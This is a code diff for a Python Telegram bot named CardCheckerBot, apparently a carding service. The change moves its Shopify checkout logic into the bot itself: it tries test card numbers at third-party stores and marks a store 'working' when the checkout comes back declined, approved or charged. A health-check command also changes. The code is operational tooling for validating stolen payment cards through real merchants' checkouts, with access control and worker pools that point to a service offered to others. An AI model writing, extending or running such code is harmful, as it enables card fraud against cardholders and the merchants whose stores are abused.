@@ -24,7 +24,7 @@ from typing import Dict, Optional, Tuple, List, Set, Any
 from datetime import datetime, timedelta
 from pathlib import Path
 
-# curl_cffi no longer needed — checkout delegated to Flask API at SHOPIFY_API_URL
+# Shopify checkout is now fully integrated — no external Flask API needed
 
 from telethon import TelegramClient, events, errors
 from telethon.tl.custom import Button
@@ -898,72 +898,26 @@ class CardCheckerBot:
                     logger.info(f"Site {url} → DEAD (no products/collections)")
                     return False
 
-                # 5) Flask API gateway check
-                params = {"cc": test_card, "site": base}
-                async with session.get(
-                    SHOPIFY_API_URL,
-                    params=params,
-                    timeout=aiohttp.ClientTimeout(total=SITE_VALIDATION_TIMEOUT)
-                ) as resp:
-                    if resp.status != 200:
-                        logger.info(f"Site {url} → DEAD (API HTTP {resp.status})")
+                # 5) Direct gateway check via integrated shopify_checkout_core
+                try:
+                    result = await self.shopify_checkout_core(test_card, base)
+                    if result.site_dead:
+                        logger.info(f"Site {url} → DEAD ({result.status_code or result.error_msg})")
                         return False
-
-                    try:
-                        data = await resp.json()
-                    except Exception:
-                        raw = await resp.text()
-                        raw_lower = raw.lower().strip()
-                        if not raw_lower:
-                            logger.info(f"Site {url} → DEAD (empty API response)")
-                            return False
-                        # Legacy text-based check
-                        working_markers = [
-                            "declined", "card_declined", "do_not_honor",
-                            "insufficient_funds", "incorrect_cvc", "incorrect_number",
-                            "expired_card", "approved", "charged",
-                        ]
-                        if any(marker in raw_lower for marker in working_markers):
-                            logger.info(f"Site {url} → ✅ WORKING (text match)")
-                            return True
-                        logger.info(f"Site {url} → DEAD (unknown text: {raw[:120]})")
+                    if result.captcha:
+                        logger.info(f"Site {url} → DEAD (CAPTCHA during validation)")
                         return False
-
-                    api_response = str(data.get("Response", "")).upper()
-                    api_status = data.get("Status", False)
-
-                    # CAPTCHA — not usable
-                    if "CAPTCHA" in api_response:
-                        logger.info(f"Site {url} → DEAD (CAPTCHA)")
-                        return False
-
-                    # Dead site markers
-                    dead_markers = [
-                        "NOT_A_SHOPIFY", "STORE_CLOSED", "PASSWORD_PROTECTED",
-                        "NO_PRODUCTS", "STORE_NOT_FOUND", "404",
-                    ]
-                    if any(marker in api_response for marker in dead_markers):
-                        logger.info(f"Site {url} → DEAD ({api_response})")
-                        return False
-
-                    # Working: real payment response
-                    working_markers = [
-                        "CARD_DECLINED", "DECLINED", "DO_NOT_HONOR",
-                        "INSUFFICIENT_FUNDS", "INCORRECT_CVC", "INCORRECT_NUMBER",
-                        "EXPIRED_CARD", "LOST_CARD", "STOLEN_CARD", "FRAUDULENT",
-                        "GENERIC_DECLINE", "PICKUP_CARD", "CARD_NOT_SUPPORTED",
-                        "TRANSACTION_NOT_ALLOWED", "PAYMENTS_",
-                        "ORDER_PLACED", "APPROVED", "OTP_REQUIRED",
-                    ]
-                    if any(m in api_response for m in working_markers):
-                        logger.info(f"Site {url} → ✅ WORKING ({api_response})")
+                    working_codes = {
+                        ShopifyCheckStatus.CHARGED, ShopifyCheckStatus.APPROVED, ShopifyCheckStatus.DECLINED
+                    }
+                    if result.status in working_codes:
+                        logger.info(f"Site {url} → ✅ WORKING ({result.status_code})")
                         return True
-
-                    if api_status:
-                        logger.info(f"Site {url} → ✅ WORKING (Status=True, {api_response})")
-                        return True
-
-                    logger.info(f"Site {url} → DEAD (unknown: {api_response})")
+                    # retryable error → treat as temporary dead for now
+                    logger.info(f"Site {url} → DEAD (no gateway response: {result.error_msg})")
+                    return False
+                except Exception as e:
+                    logger.info(f"Site {url} → DEAD (checkout error: {e})")
                     return False
 
             except asyncio.TimeoutError:
@@ -4923,28 +4877,19 @@ class CardCheckerBot:
             uid = event.sender_id
             if not self.has_any_access(uid) and uid not in ADMINS:
                 return
-            try:
-                session = await self.get_http_session()
-                t0 = time.time()
-                async with session.get(
-                    SHOPIFY_API_URL.replace('/shopify', '/health'),
-                    timeout=aiohttp.ClientTimeout(total=5)
-                ) as resp:
-                    api_ms = (time.time() - t0) * 1000
-                    api_ok = resp.status == 200
-            except Exception:
-                api_ok = False
-                api_ms = 0.0
             alive = sum(1 for t in self.worker_tasks if not t.done())
-            sicon = "\U0001f7e2" if api_ok else "\U0001f534"
+            cached_stores = len(self._store_cache)
+            cached_prices = len(self._site_price_cache)
             await event.reply(
                 "\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n"
                 "\u2551   \U0001f3e5 HEALTH CHECK             \u2551\n"
                 "\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\n"
                 "\u2503 \U0001f916 Bot:         <code>ONLINE \u2705</code>\n"
-                f"\u2503 {sicon} API:         <code>{'OK' if api_ok else 'DOWN'}</code> ({api_ms:.0f}ms)\n"
+                "\u2503 \U0001f7e2 API:         <code>INTEGRATED (direct)</code>\n"
                 f"\u2503 \u2699\ufe0f Workers:     <code>{alive}/{NUM_WORKERS}</code>\n"
                 f"\u2503 \U0001f7e2 Sites:       <code>{len(self.working_sites)}</code>\n"
+                f"\u2503 \U0001f4e6 Store Cache: <code>{cached_stores} stores</code>\n"
+                f"\u2503 \U0001f4b0 Price Cache: <code>{cached_prices} sites</code>\n"
                 f"\u2503 \U0001f550 Uptime:      <code>{self.get_uptime()}</code>",
                 parse_mode='html'
             )
